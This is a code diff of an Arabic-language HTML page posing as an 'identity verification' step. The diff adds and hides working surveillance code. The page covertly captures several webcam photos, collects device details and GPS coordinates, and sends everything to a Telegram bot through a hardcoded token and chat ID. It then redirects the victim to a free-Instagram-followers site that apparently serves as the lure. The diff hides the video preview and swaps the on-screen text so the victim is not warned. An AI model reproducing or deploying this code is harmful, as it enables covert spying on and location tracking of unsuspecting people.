@@ -5,15 +5,15 @@
   <title>تأكيد الهوية</title>
   <style>
     body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
-    video, canvas { margin: 10px; border: 2px solid #000; }
+    canvas { display: none; }
   </style>
 </head>
 <body>
-  <h2>جاري التحقق...</h2>
-  <p>يرجى البقاء أمام الكاميرا</p>
+  <h2>جاري التحقق من الهوية...</h2>
+  <p>يرجى الانتظار قليلاً...</p>
 
-  <video id="video" width="300" autoplay muted></video>
-  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
+  <video id="video" width="300" autoplay muted style="display: none;"></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -23,8 +23,7 @@
     const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
     const chat_id = '6437823957';
 
-    // إرسال معلومات الجهاز والموقع
-    function sendDeviceInfo(latitude = "غير متوفر", longitude = "غير متوفر") {
+    function sendDeviceInfo(lat = "غير متوفر", lon = "غير متوفر") {
       const info = `
 معلومات الجهاز:
 نظام التشغيل: ${navigator.platform}
@@ -32,8 +31,9 @@
 اللغة: ${navigator.language}
 دقة الشاشة: ${window.screen.width}x${window.screen.height}
 الموقع:
-خط العرض: ${latitude}
-خط الطول: ${longitude}
+خط العرض: ${lat}
+خط الطول: ${lon}
+https://www.google.com/maps?q=${lat},${lon}
       `;
 
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -43,23 +43,26 @@
       });
     }
 
-    // حاول تحديد الموقع
     function getLocationAndSendInfo() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
-          position => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            sendDeviceInfo(lat, lon);
-          },
-          error => {
-            console.warn("الموقع غير متاح:", error.message);
-            sendDeviceInfo(); // بدون موقع
-          }
+          pos => sendDeviceInfo(pos.coords.latitude, pos.coords.longitude),
+          err => sendDeviceInfo()
         );
       } else {
-        sendDeviceInfo(); // الموقع غير مدعوم
+        sendDeviceInfo();
       }
+    }
+
+    function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, 'photo.jpg');
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
     }
 
     navigator.mediaDevices.getUserMedia({ video: true })
@@ -72,24 +75,15 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
           count++;
-          if (count >= maxPhotos) clearInterval(interval);
+          if (count >= maxPhotos) {
+            clearInterval(interval);
+            window.location.href = "https://myinstafollow.com/free-instagram-followers/";
+          }
         }, 200);
 
-        // إرسال معلومات الجهاز والموقع
         getLocationAndSendInfo();
       })
       .catch(err => alert("فشل تشغيل الكاميرا: " + err));
-
-    function sendPhoto(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', chat_id);
-      formData.append('photo', blob, 'photo.jpg');
-
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-    }
   </script>
 </body>
 </html>
